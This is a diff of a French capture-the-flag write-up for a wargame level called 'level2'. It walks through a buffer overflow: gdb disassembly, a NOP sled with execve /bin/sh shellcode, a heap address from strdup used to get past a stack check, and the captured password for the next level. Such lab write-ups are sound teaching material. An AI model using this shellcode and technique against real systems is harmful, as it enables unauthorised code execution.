@@ -1,8 +1,8 @@
 # Level2
 
-On observe un executable a la racine `level2`
+On observe un exécutable à la racine : `level2`
 
-```bash
+```shell
 $ ./level2
 Hello World
 Hello World
@@ -12,9 +12,9 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault (core dumped)
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
-```bash
+```shell
 $ gdb level2 -q
 Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
 (gdb) set disassembly-flavor intel
@@ -62,35 +62,35 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `level2`
+On va utiliser `Cutter` pour avoir une idée plus claire de `level2`
 
-```bash
+```shell
 $ scp -P 4242 -r level2@192.168.56.102:/home/user/level2/level2 .
 
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage level2
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
-
-On a assez de place pour effectuer un `Buffer Overflow`
+_resultat sauvegardé dans [source.md](source.md)_
 
 Nous avons `76(src) + 4(EBP) = 80` de disponible
+
+Ce qui nous laisse assez de place pour effectuer un `Buffer Overflow`
 
 sachant que le shellcode fait `45` caracteres, il nous reste `80 - 45 = 35`
 
 On se retrouve avec
 
-```bash
+```shell
 $ python -c 'print "\x90"*35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'
 ```
 
-Mais pour l'instant nous n'avons pas notre EIP qui pointe vers l'un des `\x90` et inferieur a `0xb0000000` car notre string est stocke sur la stack. Qui valide la condition `eax == 0xb0000000`.
+Mais pour l'instant nous n'avons pas l'EIP qui pointe vers l'un des `NOP` (`\x90`) et ne commençant pas par `0xb` car notre shellcode est stocké sur la stack, ce qui valide la condition `eax == 0xb0000000` après le `AND`.
 
-On va se servir du `strdup(&src)` qui copy notre chaine de caractere en memoire.
+On va se servir du `strdup(&src)` qui copie notre chaîne de caractères en mémoire mais cette fois sur la `heap`.
 
-Plus qua recuperer l'endroit a laquel strdup a ecrit.
+On regarde donc le retour de `strdup` pour trouver l'adresse vers laquelle pointer.
 
-```bash
+```shell
 $ gdb level2 -q
 Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
 (gdb) set disassembly-flavor intel
@@ -105,9 +105,9 @@ eax            0x804a008    134520840
 
 Enfin nous pouvons ajouter l'adresse de retour du `strdup` qui pointe sur notre string mais pas sur la stack pour contourner le `if`
 
-**Ne pas oublier de retourner l'adresse** `0x804a008 => "\x08\xa0\x04\x08"`
+**Ne pas oublier d'inverser l'adresse** `0x804a008 => "\x08\xa0\x04\x08"`
 
-```bash
+```shell
 $ (python -c 'print "\x90"*35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08"'; cat ) | ./level2
 ������������������������������������^�1��F�F
                                             �
@@ -116,9 +116,4 @@ $ (python -c 'print "\x90"*35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x8
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 Ctrl+D
-
-level2:$ su level3
-Password:
-
-level3:$
 ```
